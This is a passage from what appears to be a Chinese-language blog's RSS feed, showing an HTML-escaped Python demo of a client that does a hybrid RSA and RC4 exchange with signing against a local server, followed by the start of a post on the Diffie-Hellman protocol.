class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        out&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;char &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;out&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;server_address &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;127.0.0.1&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;server_port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8888&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 生成 RSA 密钥对&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; RSA&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;generate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2048&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;private_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;export_key&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#将生成的私钥对象导出为字符串形式的私钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;public_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;publickey&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;export_key&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#将生成的公钥对象导出为字符串形式的公钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#导出的密钥以字符串形式表示，通常使用 PEM (Privacy-Enhanced Mail) 格式编码。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 这样，密钥可以被保存、传输和加载到其他程序中进行使用。在代码中，导出的私钥和公钥字符串被打印出来以便查看。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;加密密钥:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; private_key&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;公钥:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; public_key&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 连接服务器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AF_INET&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SOCK_STREAM&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;connect&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;server_address&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; server_port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 发送公钥给服务器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;public_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;公钥已发送给服务器：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; public_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 接收服务器的签名公钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;server_public_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4096&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;收到服务器的签名公钥:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; server_public_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 导入服务器的签名公钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rsa_server_public_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; RSA&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;import_key&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;server_public_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#提取出 n 和 e&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 使用服务器的公钥加密 RC4 密钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rsa_cipher &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; PKCS1_OAEP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;new&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rsa_server_public_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#是一个用于创建 PKCS 密码方案的对象的方法。用于在非对称加密中提供安全性和填充方案。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 它使用一种随机化机制和填充方式，增加了加密的安全性，并且能够处理较短的明文。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 该对象可以使用公钥进行加密操作，或使用私钥进行解密操作。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 生成随机 RC4 密钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rc4_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;randint&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; _ &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;生成随机RC4加密密钥:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; rc4_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;encrypted_rc4_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; rsa_cipher&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rc4_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;RC4密钥已用服务器的公钥加密:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; encrypted_rc4_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 要发送的消息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;message &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;请输入你要加密的消息:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 加密消息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;encrypted_message &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; rc4_encrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rc4_key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; message&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;明文信息已加密。&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 使用客户端的私钥对加密后的消息进行签名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;76&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hash_obj &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; SHA256&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;new&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;encrypted_message&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;77&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;signature &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; pkcs1_15&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;new&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sign&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hash_obj&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#这部分代码创建了一个 pkcs1_15 对象，它用于对数据进行加密或签名操作。key 是一个 RSA 密钥对象，它包含了公钥或私钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;78&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;生成数字签名:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; signature&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;79&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;80&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 将加密的 RC4 密钥和消息发送给服务器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;81&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;encrypted_rc4_key &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; encrypted_message&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;82&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;加密RC4密钥和加密信息已发送给服务器。&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;83&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;84&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 将签名发送给服务器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;85&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;signature&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;86&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;数字签名已发送给服务器。&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;87&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;88&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 关闭客户端连接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;89&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/07/24/DH%E5%8D%8F%E8%AE%AE/</guid>
            <title>DH协议</title>
            <link>http://example.com/2023/07/24/DH%E5%8D%8F%E8%AE%AE/</link>
            <pubDate>Mon, 24 Jul 2023 13:58:19 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;服务器端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器端&#34;&gt;#&lt;/a&gt; 服务器端&lt;/h1&gt;
